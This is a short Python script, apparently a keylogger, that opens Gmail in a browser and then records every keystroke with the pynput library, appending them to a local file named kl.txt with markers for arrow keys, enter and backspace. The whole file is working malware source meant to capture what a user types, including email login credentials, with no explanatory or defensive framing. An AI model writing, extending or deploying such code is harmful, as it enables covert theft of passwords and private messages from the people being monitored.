#  main

import webbrowser as wb
import pynput 
from pynput.keyboard import Key,Listener

wb.open('mail.google.com')

li_keys = []
count = 0

def on_press(key):
    
    global li_keys , count
    
    if key == Key.space:
        li_keys.append(" ")
    else:
        li_keys.append(key)
        count += 1
        if count > 0:
            count = 0
            write_file(li_keys)
            li_keys = []
        
        
def on_release(key):
    if (key == Key.esc) * 2:
        return False

def write_file(li_keys):
    with open('kl.txt','a') as file:
        for i in li_keys:
            k = str(i).replace("'","")
            if i == Key.backspace:
                file.write('!')
            elif i == Key.up:
                file.write(" (up) ")
            elif i == Key.down:
                file.write(" (down) ")
            elif i == Key.right:
                file.write(" (right) ")
            elif i == Key.left:
                file.write(" (left) ")
            elif i == Key.enter:
                file.write('\n')
            elif i == Key.ctrl_l or i == Key.shift or i == Key.tab or i == Key.alt_l or i ==Key.esc:
                file.write("")
            else:
                file.write(k)
    
with Listener(on_press = on_press , on_release = on_release) as l:
    l.join()
